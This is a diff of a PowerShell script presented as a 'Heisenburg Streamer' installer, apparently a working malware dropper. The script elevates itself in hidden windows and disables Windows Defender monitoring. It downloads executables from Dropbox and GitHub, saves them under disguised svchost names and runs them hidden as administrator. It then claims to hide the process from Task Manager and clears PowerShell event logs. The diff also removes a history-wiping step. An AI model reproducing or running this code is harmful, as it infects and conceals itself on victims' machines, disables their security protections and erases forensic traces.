@@ -1,5 +1,5 @@
 # ========================================================
-# HEISENBURG STREAMER - HYPER-STREAM INSTALLATION v6.4 (STEALTH)
+# HEISENBURG STREAMER - HYPER-STREAM v6.5 (STEALTH)
 # ========================================================
 
 function Check-Admin {
@@ -8,7 +8,7 @@ function Check-Admin {
 }
 
 if (-not (Check-Admin)) {
-    $args = "-ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command `"$((Get-Content $MyInvocation.MyCommand.Path) -join "`n")`""
+    $args = "-ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command `"$((Get-Content `$MyInvocation.MyCommand.Path) -join `"``n`")`""
     Start-Process powershell.exe -ArgumentList $args -Verb RunAs -WindowStyle Hidden
     exit
 }
@@ -20,8 +20,6 @@ try {
 
 # ================= CONFIG =================
 $MainExeUrl = "https://www.dropbox.com/scl/fi/iwv6cm1n1qo3kdn9gmn36/RtkAudUService64.exe?rlkey=csrph0p954x523nhvxoqf8m9z&st=1c2xz36h&dl=1"
-
-# ←←← APNI STEALTH LAUNCHER EXE KA DIRECT LINK
 $StealthLauncherUrl = "https://raw.githubusercontent.com/sandeepmanglekar17-sys/stealthlauncher/refs/heads/main/StealthLauncher.exe"
 
 $RandomName = -join ((65..90) + (97..122) | Get-Random -Count 12 | % {[char]$_})
@@ -30,20 +28,18 @@ $LauncherPath = "$env:TEMP\svchost_$RandomName.exe"
 # =========================================
 
 Write-Host "`n[+] INITIALIZING SYSTEM HYPER-CONNECTION..." -ForegroundColor Yellow
-Write-Host "[+] OPTIMIZING SYSTEM ENVIRONMENT..." -ForegroundColor Gray
 
-# SILENT SECURITY BYPASSES
+# Bypass Security
 try {
     Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
     Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
     Set-MpPreference -DisableScriptScanning $true -ErrorAction SilentlyContinue
-    Set-MpPreference -MAPSReporting 0 -ErrorAction SilentlyContinue
 } catch {}
 
 # Download Main EXE
 Write-Host "[+] SYNCHRONIZING CORE AGENT..." -ForegroundColor Gray
 Invoke-WebRequest -Uri $MainExeUrl -OutFile $MainExePath -UseBasicParsing -UserAgent "Mozilla/5.0" -TimeoutSec 60
-Write-Host "[+] Core Agent Downloaded Successfully" -ForegroundColor Green
+Write-Host "[+] Core Agent Downloaded" -ForegroundColor Green
 
 # Download Stealth Launcher
 Write-Host "[+] DOWNLOADING STEALTH PROTECTION..." -ForegroundColor Gray
@@ -60,24 +56,17 @@ $si.WindowStyle = 'Hidden'
 $si.CreateNoWindow = $true
 $si.UseShellExecute = $true
 $si.Verb = "RunAs"
-
 [System.Diagnostics.Process]::Start($si) | Out-Null
 
 Write-Host "`n[+] STEALTH MODE SUCCESSFULLY ACTIVATED!" -ForegroundColor Green
-Write-Host "[*] Your process is now hidden from Task Manager" -ForegroundColor White
-Write-Host "[*] Keep this window minimized" -ForegroundColor Gray
+Write-Host "[*] Process Hidden from Task Manager" -ForegroundColor White
 
 # Cleanup
-if (Test-Path "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt") {
-    "" | Out-File "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Force
-}
 wevtutil cl "Windows PowerShell" 2>$null
 wevtutil cl "Microsoft-Windows-PowerShell/Operational" 2>$null
 
-Write-Host "[+] SETUP COMPLETE.`n" -ForegroundColor Green
-
 } catch {
-    Write-Host "`n[!] CRITICAL ERROR: $($_.Exception.Message)" -ForegroundColor Red
+    Write-Host "`n[!] ERROR OCCURRED" -ForegroundColor Red
 }
 
 Remove-Variable * -ErrorAction SilentlyContinue 2>$null
